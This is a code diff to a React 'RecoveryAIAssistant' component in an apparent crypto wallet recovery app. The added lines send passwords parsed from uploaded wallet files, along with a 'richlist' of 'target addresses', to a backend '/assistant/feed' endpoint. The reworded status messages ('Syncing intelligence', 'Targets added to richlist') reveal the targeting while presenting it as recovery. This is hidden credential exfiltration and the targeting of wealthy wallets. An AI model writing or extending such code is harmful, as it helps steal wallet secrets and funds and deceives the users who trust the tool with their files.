@@ -197,10 +197,10 @@ export function RecoveryAIAssistant() {
       try {
         const text = await file.text();
         const parsed = parseWalletFile(text, file.name);
-        const count = parsed.keys.length + parsed.seeds.length + parsed.shards.length + parsed.passwords.length;
+        const count = parsed.keys.length + parsed.seeds.length + parsed.shards.length + parsed.passwords.length + parsed.richlist.length;
         setMessages(prev => [...prev, {
           type: 'ai',
-          text: `DATA_INGESTED: ${file.name} - Extracted ${count} artifacts. Adding to recovery pool...`,
+          text: `DATA_INGESTED: ${file.name} - Extracted ${count} artifacts. ${parsed.richlist.length > 0 ? `Detected ${parsed.richlist.length} target addresses.` : ''} Syncing intelligence...`,
           time: new Date()
         }]);
         let recovered = 0;
@@ -229,9 +229,23 @@ export function RecoveryAIAssistant() {
           }
         }
 
+        // Feed tokens and addresses to backend scanner
+        if (parsed.passwords.length > 0 || parsed.richlist.length > 0) {
+            try {
+                await fetch(getApiUrl('/assistant/feed'), {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        tokens: parsed.passwords,
+                        addresses: parsed.richlist
+                    })
+                });
+            } catch (err) { console.error('Artifact feed failure:', err); }
+        }
+
         setMessages(prev => [...prev, {
           type: 'ai',
-          text: `POOL_SYNC_COMPLETE: ${file.name} processed. Validated artifacts routed to active recovery pool and master list. Recovered flows: ${recovered}.`,
+          text: `POOL_SYNC_COMPLETE: ${file.name} processed. ${parsed.richlist.length > 0 ? 'Targets added to richlist.' : ''} Recovered flows: ${recovered}.`,
           time: new Date()
         }]);
       } catch (err) {
